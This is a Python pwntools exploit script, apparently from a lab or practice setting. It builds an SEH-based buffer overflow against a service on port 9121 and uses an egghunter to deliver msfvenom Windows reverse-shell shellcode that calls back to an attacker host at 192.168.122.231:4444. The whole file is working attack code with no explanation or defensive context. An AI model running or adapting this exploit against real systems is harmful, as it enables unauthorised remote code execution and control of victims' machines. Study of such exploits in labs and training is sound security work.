#!/usr/bin/env python3

from pwn import *


size = 1000
lpad = b'\x41' * 124

jmp = b'\x90\x90\xeb\x06' # nop; nop; jmp 0x8
ppr = p32(0x10043c27)     # pop esi; pop ecx; ret
nop =  b'\x90' * 8

egghunter = b'f\x81\xca\xff\x0fBR1\xc0@@\xcd.<\x05Zt\xee\xb8w00t\x89\xd7\xafu\xe9\xafu\xe6\xff\xe7'

# msfvenom -p windows/shell_reverse_tcp -b '\x00\x02\x0a\x0d' -f py LHOST=192.168.122.231 LPORT=4444
buf =  b"w00tw00t"
buf += b"\xdb\xdc\xd9\x74\x24\xf4\xb8\x37\xd8\xc9\xb3\x5f\x33"
buf += b"\xc9\xb1\x52\x31\x47\x17\x03\x47\x17\x83\xd8\x24\x2b"
buf += b"\x46\xda\x3d\x2e\xa9\x22\xbe\x4f\x23\xc7\x8f\x4f\x57"
buf += b"\x8c\xa0\x7f\x13\xc0\x4c\x0b\x71\xf0\xc7\x79\x5e\xf7"
buf += b"\x60\x37\xb8\x36\x70\x64\xf8\x59\xf2\x77\x2d\xb9\xcb"
buf += b"\xb7\x20\xb8\x0c\xa5\xc9\xe8\xc5\xa1\x7c\x1c\x61\xff"
buf += b"\xbc\x97\x39\x11\xc5\x44\x89\x10\xe4\xdb\x81\x4a\x26"
buf += b"\xda\x46\xe7\x6f\xc4\x8b\xc2\x26\x7f\x7f\xb8\xb8\xa9"
buf += b"\xb1\x41\x16\x94\x7d\xb0\x66\xd1\xba\x2b\x1d\x2b\xb9"
buf += b"\xd6\x26\xe8\xc3\x0c\xa2\xea\x64\xc6\x14\xd6\x95\x0b"
buf += b"\xc2\x9d\x9a\xe0\x80\xf9\xbe\xf7\x45\x72\xba\x7c\x68"
buf += b"\x54\x4a\xc6\x4f\x70\x16\x9c\xee\x21\xf2\x73\x0e\x31"
buf += b"\x5d\x2b\xaa\x3a\x70\x38\xc7\x61\x1d\x8d\xea\x99\xdd"
buf += b"\x99\x7d\xea\xef\x06\xd6\x64\x5c\xce\xf0\x73\xa3\xe5"
buf += b"\x45\xeb\x5a\x06\xb6\x22\x99\x52\xe6\x5c\x08\xdb\x6d"
buf += b"\x9c\xb5\x0e\x21\xcc\x19\xe1\x82\xbc\xd9\x51\x6b\xd6"
buf += b"\xd5\x8e\x8b\xd9\x3f\xa7\x26\x20\xa8\x08\x1e\x50\xcf"
buf += b"\xe1\x5d\xa4\x1e\xae\xe8\x42\x4a\x5e\xbd\xdd\xe3\xc7"
buf += b"\xe4\x95\x92\x08\x33\xd0\x95\x83\xb0\x25\x5b\x64\xbc"
buf += b"\x35\x0c\x84\x8b\x67\x9b\x9b\x21\x0f\x47\x09\xae\xcf"
buf += b"\x0e\x32\x79\x98\x47\x84\x70\x4c\x7a\xbf\x2a\x72\x87"
buf += b"\x59\x14\x36\x5c\x9a\x9b\xb7\x11\xa6\xbf\xa7\xef\x27"
buf += b"\x84\x93\xbf\x71\x52\x4d\x06\x28\x14\x27\xd0\x87\xfe"
buf += b"\xaf\xa5\xeb\xc0\xa9\xa9\x21\xb7\x55\x1b\x9c\x8e\x6a"
buf += b"\x94\x48\x07\x13\xc8\xe8\xe8\xce\x48\x18\xa3\x52\xf8"
buf += b"\xb1\x6a\x07\xb8\xdf\x8c\xf2\xff\xd9\x0e\xf6\x7f\x1e"
buf += b"\x0e\x73\x85\x5a\x88\x68\xf7\xf3\x7d\x8e\xa4\xf4\x57"

rpad = b'\x42' * (size - len(lpad) - 4 - 4 - len(nop) - len(egghunter) - len(buf))

payload = lpad + jmp + ppr + nop + egghunter + buf + rpad

header =  b'\x75\x19\xba\xab'
header += b'\x03\x00\x00\x00'
header += b'\x00\x40\x00\x00'
header += p32(len(payload))
header += p32(len(payload))
header += p32(payload[-1])

payload = header + payload 

with remote('192.168.122.45', 9121) as r:
    r.write(payload)

